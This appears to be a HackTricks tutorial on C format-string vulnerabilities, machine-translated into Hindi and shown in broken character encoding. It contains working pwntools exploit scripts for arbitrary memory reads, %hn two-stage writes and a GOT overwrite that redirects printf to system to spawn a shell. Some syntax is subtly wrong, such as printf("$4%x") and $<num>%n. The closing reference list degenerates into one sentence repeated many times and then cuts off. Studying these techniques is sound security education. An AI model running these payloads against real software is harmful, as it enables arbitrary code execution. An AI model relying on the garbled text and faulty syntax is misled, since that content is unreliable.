# рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреАрдЬ**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** рдЯреНрд╡рд┐рдЯрд░ рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

C рдореЗрдВ **`printf`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреА рдкрд╣рд▓реА рдкреИрд░рд╛рдореАрдЯрд░ рдЙрдореНрдореАрджрд╡рд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ **рдлреЙрд░реНрдореЗрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдХрдЪреНрдЪрд╛ рдкрд╛рда** рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИред рдЙрдореНрдореАрджрд╡рд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ **рдЙрдореНрдореАрджрд╡рд╛рд░ рдХреЗ рдкрд╣рд▓реЗ рддрд░реНрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдлрд╝рдВрдХреНрд╢рдиред рдЕрдЯреИрдХрд░ рдХреЛ **рд╡рд┐рд╢реЗрд╖ рдЗрдирдкреБрдЯ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ рдЬреЛ **printf рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдкрддреЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рд╣реЛрддреА рд╣реИ (рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп/рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп)ред рдЗрд╕ рддрд░рд╣ рд╕реЗ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдХреЛрдб** рдХреЛ **рдЪрд▓рд╛рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред

#### рдлреЙрд░реНрдореЗрдЯрд░реНрд╕:
```bash
%08x тАФ> 8 hex bytes
%d тАФ> Entire
%u тАФ> Unsigned
%s тАФ> String
%n тАФ> Number of written bytes
%hn тАФ> Occupies 2 bytes instead of 4
<n>$X тАФ> Direct access, Example: ("%3$d", var1, var2, var3) тАФ> Access to var3
```
**рдЙрджрд╛рд╣рд░рдг:**

* рд╡рдВрд▓рд░реЗрдмрд▓ рдЙрджрд╛рд╣рд░рдг:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧ:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* рдЧреБрдо рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
### **рдкреЙрдЗрдВрдЯрд░ рддрдХ рдкрд╣реБрдВрдЪрдирд╛**

рдлреЙрд░реНрдореЗрдЯ **`%<n>$x`**, рдЬрд╣рд╛рдВ `n` рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ, printf рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ n рдкреИрд░рд╛рдореАрдЯрд░ (рд╕реНрдЯреИрдХ рд╕реЗ) рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рддреЛ рдпрджрд┐ рдЖрдк printf рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдЯреИрдХ рд╕реЗ 4рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```c
printf("%x %x %x %x")
```
рдФрд░ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рдЪреМрдереЗ рдкреИрд░рд╛рдореАрдЯрд░ рддрдХ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```c
printf("$4%x")
```
рдФрд░ рд╕реАрдзреЗ рдЪреМрдереЗ рдХреЛ рдкрдврд╝реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ `pr`**`intf` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐** рдЬрдм `printf` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХрд╛ рдЗрдирдкреБрдЯ рд╕реНрдЯреИрдХ рдореЗрдВ рд╣реЛрдЧрд╛, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд╣ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдореЗрдореЛрд░реА рдкрддреЛрдВ рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИред

{% hint style="danger" %}
рдЗрд╕ рдЗрдирдкреБрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░, **рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ arbitrary рдкрддрд╛ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ `printf` рдХреЛ рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред рдЕрдЧрд▓реЗ рдЦрдВрдб рдореЗрдВ рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

## **рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдкрдарди**

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдо **`$n%s`** рдлреЙрд░реНрдореЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **`printf`** рдХреЛ **рдкрддрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **n рд╕реНрдерд╛рди** рдореЗрдВ рд╕реНрдерд┐рдд рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рдж рдФрд░ **рдЙрд╕реЗ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рддрд░рд╣ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдВ** (0x00 рдкрд╛рдП рдЬрд╛рдиреЗ рддрдХ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдВ)ред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдХрд╛ рдмреЗрд╕ рдкрддрд╛ рд╣реИ **`0x8048000`**, рдФрд░ рд╣рдореЗрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рд╕реНрдЯреИрдХ рдореЗрдВ 4рд╡реЗрдВ рд╕реНрдерд╛рди рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдмрд╛рдЗрдирд░реА рдХреА рд╢реБрд░реБрдЖрдд рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```python
from pwn import *

p = process('./bin')

payload = b'%6$p' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк 0x8048000 рдкрддреЗ рдХреЛ рдЗрдирдкреБрдЯ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдирд╣реАрдВ рдбрд╛рд▓ рд╕рдХрддреЗ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдкрддреЗ рдХреЗ рдЕрдВрдд рдореЗрдВ 0x00 рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

## **рдЕрдирд┐рдпрдорд┐рдд рд▓реЗрдЦрди**

рдлреЙрд░реНрдореЗрдЯрд░ **`$<num>%n`** **рдЙрд╕ рдкрддреЗ рдкрд░ рд▓рд┐рдЦрддрд╛ рд╣реИ** рдЬрд┐рд╕реЗ \<num> рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рд▓рд┐рдЦреЗ рдЧрдП рдмрд╛рдЗрдЯ рдХреА рд╕рдВрдЦреНрдпрд╛** рд╣реЛрддреА рд╣реИред рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ printf рдХреЗ рд╕рд╛рде рдЬрд┐рддрдиреЗ рд╡рд░реНрдг рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **`$<num>%n`** рдХреЛ рдХрд┐рд╕реА рднреА рдкрддреЗ рдкрд░ рдХрд┐рд╕реА рднреА рд╕рдВрдЦреНрдпрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рддреМрд░ рдкрд░, рдЕрдВрдХ 9999 рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдирдкреБрдЯ рдореЗрдВ 9999 "A" рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлреЙрд░реНрдореЗрдЯрд░ **`%.<num-write>%<num>$n`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **`<num-write>`** рдХреЛ **`num` рд╕реНрдерд╛рди** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХреЗрддрд┐рдд рдкрддреЗ рдкрд░ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХреЗред
```bash
AAAA%.6000d%4\$n тАФ> Write 6004 in the address indicated by the 4┬║ param
AAAA.%500\$08x тАФ> Param at offset 500
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдо рддреМрд░ рдкрд░ рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрддрд╛ рдЬреИрд╕реЗ `0x08049724` (рдЬреЛ рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рд╣реИ рдПрдХ рд╕рд╛рде рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП), **`$n`** рдХреА рдмрдЬрд╛рдп **`$hn`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ **рдХреЗрд╡рд▓ 2 рдмрд╛рдЗрдЯ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рджреЛ рдмрд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ, рдкрд╣рд▓реЗ рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ 2B рдХреЗ рд▓рд┐рдП рдФрд░ рджреВрд╕рд░реА рдмрд╛рд░ рд╕рдмрд╕реЗ рдХрдо рд╡рд╛рд▓реЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд┐рд╕реА рднреА рдкрддреЗ рдореЗрдВ рдХреБрдЫ рднреА рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рд╡рд┐рд╡реЗрдХрд╛рддреНрдордХ рд▓реЗрдЦрди).

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд▓рдХреНрд╖реНрдп рд╣реЛрдЧрд╛ рдХрд┐рд╕реА рдмрд╛рдж рдореЗрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ **GOT** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ **рдХрд╛рд░реНрдп** рдХреЗ **рдкрддреЗ** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдирд╛ред рдпрджреНрдпрдкрд┐ рдЗрд╕рд╕реЗ рдЕрдиреНрдп рд╡рд┐рд╡реЗрдХрд╛рддреНрдордХ рд▓реЗрдЦрди рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

рд╣рдо рдПрдХ **рдХрд╛рд░реНрдп** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдЕрдкрдиреЗ **рдкреНрд░рд╛рд░рдВрднрд┐рдХ** рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╕реЗ **рдкреНрд░рд╛рдкреНрдд** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **`system`** **рдХрд╛рд░реНрдп** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИред
рдЬреИрд╕рд╛ рдХрд┐ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣реИ, рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдо рддреМрд░ рдкрд░ 2 рдХрджрдо рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреЗ рд╣реИрдВ: рдЖрдк **рдкрд╣рд▓реЗ 2 рдмрд╛рдЗрдЯ** рдкрддреЗ рдХрд╛ рд▓рд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ 2 рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`$hn`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **HOB** рдкрддреЗ рдХреЗ 2 рдЙрдЪреНрдЪ рдмрд╛рдЗрдЯ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* **LOB** рдкрддреЗ рдХреЗ 2 рдирд┐рдЪрд▓реЗ рдмрд╛рдЗрдЯ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдлрд┐рд░, рдЪрд╛рд╣реЗ рдЬреИрд╕реЗ рд╣реА рдкреНрд░рд╛рд░реВрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛рдо рдХрд░рддреА рд╣реИ, рдЖрдкрдХреЛ **рд╕рдмрд╕реЗ рдЫреЛрдЯрд╛ рдкрд╣рд▓реЗ** рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ \[HOB, LOB] рдФрд░ рдлрд┐рд░ рджреВрд╕рд░рд╛ред

рдпрджрд┐ HOB < LOB\
`[рдкрддрд╛+2][рдкрддрд╛]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

рдпрджрд┐ HOB > LOB\
`[рдкрддрд╛+2][рдкрддрд╛]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N┬║Param\_dir\_HOB LOB\_shell-HOB\_shell N┬║Param\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools рдЯреЗрдореНрдкрд▓реЗрдЯ

рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

рдпрд╛ рдпрд╣ рдореМрд▓рд┐рдХ рдЙрджрд╛рд╣рд░рдг [**рдпрд╣рд╛рдБ рд╕реЗ**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32 рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдПрдирдПрдХреНрд╕, рдХреЛрдИ рдкрд╛рдИ рдирд╣реАрдВ, рдмреЗрд╕рд┐рдХ рддрд░реАрдХреЗ рд╕реЗ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдЯреИрдХ рд╕реЗ рдлреНрд▓реИрдЧ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдлреНрд▓реЛ рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 рдмрд┐рдЯ, relro, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдПрдирдПрдХреНрд╕, рдХреЛрдИ рдкрд╛рдИ рдирд╣реАрдВ, рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрддрд╛ `fflush` рдХреЛ рдЬреАрддрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рди рдлрдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд░реЛрд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32 рдмрд┐рдЯ, relro, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдПрдирдПрдХреНрд╕, рдХреЛрдИ рдкрд╛рдИ рдирд╣реАрдВ, рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореЗрди рдореЗрдВ рдПрдХ рдкрддреЗ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП `.fini_array` рдореЗрдВ рдФрд░ `system` рдореЗрдВ рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ `strlen` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ 